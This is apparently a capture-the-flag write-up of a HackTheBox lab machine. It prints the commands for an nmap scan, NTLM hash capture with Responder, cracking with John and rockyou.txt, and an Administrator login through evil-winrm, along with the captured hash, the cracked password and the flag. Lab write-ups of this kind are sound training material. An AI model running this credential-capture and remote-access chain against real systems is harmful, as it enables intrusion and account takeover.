## Table of contents
* [General info](#general-info)
* [Technologies](#technologies)
* [Tunneling](#tunelling)
* [Scanning](#scanning)
* [Website check](#website-check)
* [Hash Cracking](#hash-cracking)
* [Reverse Shell](#reverse-shell)

## General-Info
Capturing flag in a machine using Kali Linux and its tools. Vulnerable machine I.P. provided by HackTheBox.
## Technologies
Download and install vmware workstation player from : https://www.vmware.com/in/products/workstation-player.html
Download Kali Linux VMware runable file : https://www.kali.org/get-kali/#kali-virtual-machines
## Tunneling 
Tunneling to the network of victim machine
```
openvpn starting_point_hellthrall.ovpn
```
![1](https://user-images.githubusercontent.com/86112651/176484822-a0a146e0-3bf8-4579-894d-b65f927c4be6.png)

## Scanning
We will scan for open vulnerable ports using N-map
```
 nmap -sS -p- -sV -sC -T5 -v 10.129.38.135
```
![image](https://user-images.githubusercontent.com/86112651/176484980-7b9d4178-5a1a-4401-9c0e-aeea8eb08308.png)
![image](https://user-images.githubusercontent.com/86112651/176485044-ff3baba3-d1ee-4a5d-a070-16e497ea9e74.png)


## Website check
Checking and exploiting website vulnerabilities
Checking at port 80:
![unika](https://user-images.githubusercontent.com/86112651/176470686-dc3e64af-4197-42ea-b3fc-6a460172a1e8.gif)
Editing etc/hosts :
```
nano etc/hosts
```
![image](https://user-images.githubusercontent.com/86112651/176485190-bd9e20a7-da64-4f10-b995-210d9a6a6f2c.png)

![image](https://user-images.githubusercontent.com/86112651/176475712-0a9aef33-159b-4c28-a935-9f7b170600d2.png)
Checking for Remote File Inclusion vulnerability :
![unika2](https://user-images.githubusercontent.com/86112651/176477254-05e30cbd-379f-48d6-acca-94142367e01d.gif)
Using Responder to get Admin hash :
```
responder -I tun0
```
![image](https://user-images.githubusercontent.com/86112651/176478256-59b2ac2c-47c9-40c3-998b-51cea6ec3a77.png)
![image](https://user-images.githubusercontent.com/86112651/176478398-f6f0adad-22e4-45bb-ad5c-692ff8c136e2.png)
## Hash Cracking 
Cracking hash using John the ripper
Our hash from Responder is :
![image](https://user-images.githubusercontent.com/86112651/176478704-071e5bf1-00e2-4ade-ae5e-0b31a70f5440.png)
Saving hash in a file :
```
nano hash
```
```
Administrator::RESPONDER:5866e40400882648:E6797E1830B3CB708A977A038024B2EC:010100000000000080F7E5F3AC8BD80102F5E478604DB26C00000000020008005100330055005A0001001E00570049004E002D0033005300420031003600330039004E0054003300590004003400570049004E002D0033005300420031003600330039004E005400330059002E005100330055005A002E004C004F00430041004C00030014005100330055005A002E004C004F00430041004C00050014005100330055005A002E004C004F00430041004C000700080080F7E5F3AC8BD80106000400020000000800300030000000000000000100000000200000B6217D145D0728787915A475C59A1C43AF074A62F50C798B53CF0FC279F96C7E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310030000000000000000000

```
Starting John the ripper using infamous rockyou.txt:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```
![image](https://user-images.githubusercontent.com/86112651/176481030-bd590786-5633-4782-bbbf-1159f1d6f99a.png)
Hash cracked
## Reverse Shell
Using evil-winrm and the hash cracked password to spawn a reverse shell 
```
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Downloading evil-winrm :
```
apt-get install evil-winrm
```
Starting evil-winrm :
```
evil-winrm -i 10.129.38.135 -u Administrator -p badminton 
```
![image](https://user-images.githubusercontent.com/86112651/176482332-0214c8ce-5731-480a-80f2-cb4004ccad9d.png)



![flag](https://user-images.githubusercontent.com/86112651/176484148-b2a47a55-c7e8-45d6-97d1-deb040a295dd.gif)
Flag found :
```
   Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac

```

